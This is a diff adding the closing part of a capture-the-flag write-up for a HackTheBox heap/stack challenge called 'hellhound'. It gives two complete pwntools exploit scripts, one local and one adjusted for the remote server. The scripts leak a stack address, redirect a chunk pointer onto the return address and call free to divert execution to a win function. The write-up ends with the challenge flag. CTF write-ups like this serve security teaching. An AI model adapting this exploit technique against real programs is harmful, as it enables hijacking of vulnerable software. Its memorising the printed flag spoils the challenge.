@@ -126,4 +126,140 @@ The fake chunk can only be 0 (NULL) or the actual chunk. Hence the heap concept 
 ```
 
 6. Great! Now the last payload we need to send is the berserk_mode_off() address + fake chunk.
+7. Then we moved it again forward 8 bytes to it points to our fake chunk.
+8. Then we call 69, which already points to our berserk_mode_off() address.
 
+> FINAL SCRIPT
+
+```py
+from pwn import *
+import os 
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './hellhound'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+sh = start()
+sh.sendlineafter(b'>', b'1')
+sh.recvuntil(b': [')
+get = sh.recvline().strip()
+leaked = get[:15]
+leaked = int(leaked)
+log.success(f'LEAKED STACK ADDRESS --> {hex(leaked)}')
+
+rip = 80 # 64 (malloc) + canary + choice
+ret_addr = leaked + rip
+log.info(f'RET ADDRESS --> {hex(ret_addr)}')
+
+sh.sendlineafter(b'>', b'2')
+p = flat([
+    asm('nop') * 8, # padding for 8 bytes moved at option 3
+    ret_addr
+])
+sh.sendlineafter(b':', p)
+sh.sendlineafter(b'>', b'3') # moves chunk pointer 8 bytes, now chunk points to return address.
+
+## FINAL PAYLOAD
+pay = flat([
+    elf.sym['berserk_mode_off'],
+    0x0 # fake chunk
+])
+
+sh.sendlineafter(b'>', b'2') 
+sh.sendlineafter(b':', pay) # send payload 
+sh.sendlineafter(b'>', b'3') # moves 8 bytes, now chunk points to fake chunk
+sh.sendlineafter(b'>', b'69') # free memory
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/418b33b8-967f-4b20-952d-2456aeb7b36f)
+
+
+> TEST REMOTELY
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b7461770-8387-4cdb-b194-0d95b6d3fbfb)
+
+
+9. Confused why it failed, until i realized the bytes we're sending are different from the local solve. Hence i'm tweaking with the pwntools function used when sending the payload.
+
+> Not only this, there's more different bytes receieved and sent, this is why we don't get the flag remotely.
+
+![yak](https://github.com/jon-brandy/hackthebox/assets/70703371/f5f00b49-e027-4b4c-a521-5e0fd69b68bb)
+
+
+10. Here's the solve script for the remote server.
+
+```py
+from pwn import *
+import os 
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './hellhound'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+sh = start()
+sh.sendlineafter(b'>', b'1')
+sh.recvuntil(b': [')
+get = sh.recvline().strip()
+leaked = get[:15]
+leaked = int(leaked)
+log.success(f'LEAKED STACK ADDRESS --> {hex(leaked)}')
+
+rip = 80 # 64 (malloc) + canary + choice
+ret_addr = leaked + rip
+log.info(f'RET ADDRESS --> {hex(ret_addr)}')
+
+sh.sendlineafter(b'>', b'2')
+p = flat([
+    asm('nop') * 8, # padding for 8 bytes moved at option 3
+    ret_addr
+])
+# sh.sendlineafter(b':', p)
+sh.sendafter(b': ', p)
+sh.sendlineafter(b'>', b'3') # moves chunk pointer 8 bytes, now chunk points to return address.
+
+## FINAL PAYLOAD
+pay = flat([
+    elf.sym['berserk_mode_off'],
+    0x0 # fake chunk
+])
+
+sh.sendlineafter(b'>', b'2') 
+# sh.sendlineafter(b':', pay) # send payload 
+sh.sendafter(b': ', pay)
+sh.sendlineafter(b'>', b'3') # moves 8 bytes, now chunk points to fake chunk
+sh.sendlineafter(b'>', b'69') # free memory
+
+sh.interactive()
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/598346ce-07ec-4216-9a92-1b623b742c46)
+
+
+11. Got the flag!
+
+
+## FLAG
+
+```
+HTB{m4y_the_d0g5_5p1r1t_b3_w1th_u}
+```
